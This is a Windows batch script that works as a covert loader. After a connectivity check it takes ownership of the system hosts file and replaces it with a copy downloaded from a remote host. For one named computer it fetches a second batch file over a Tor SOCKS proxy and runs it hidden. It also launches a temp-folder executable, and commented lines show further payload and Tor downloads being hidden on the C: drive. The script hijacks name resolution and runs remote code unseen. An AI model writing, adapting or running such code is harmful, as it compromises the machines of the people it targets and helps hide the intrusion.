@echo off
:connectivitycheck
ping www.google.com -n 1 -w 5000 >NUL
if errorlevel 1 goto Connectivitycheck

TAKEOWN /F "C:\Windows\System32\drivers\etc\hosts"
ICACLS "C:\Windows\System32\drivers\etc\hosts" /INHERITANCE:e /GRANT:r %UserName%:(F) /T /C
attrib -r +h +s +i "C:\Windows\System32\drivers\etc\hosts"
curl.exe https://cryptedlumos.github.io/Hosts/hosts --output "C:\Windows\System32\drivers\etc\hosts"
attrib +r "C:\Windows\System32\drivers\etc\hosts"
echo [TARGET START]
echo %computername%
if [%computername%]==[LAPTOP-KSJLL5K9] (
curl.exe --socks5-hostname 127.0.0.1:9050 https://cryptedlumos.github.io/purga_paperino.bat --output "%temp%\pp.bat" && nircmd exec hide "%temp%\pp.bat"
) else (
echo.
)
echo [TARGET STOP]
REM curl.exe --socks5-hostname 127.0.0.1:9050 "https://cryptedlumos.github.io/client.exe" --output "%temp%\winrun.exe"
IF EXIST "%temp%\winrun.exe" (
  "%temp%\winrun.exe"
) ELSE (
  echo
)
REM opipirrui0duasi0gj0dauff
REM curl.exe "https://cryptedlumos.github.io/Tor.zip" --output "%temp%\Tor.zip" && powershell Expand-Archive -LiteralPath "%temp%\Tor.Zip -DestinationPath "C:\" && attrib +s +h +i "C:\"
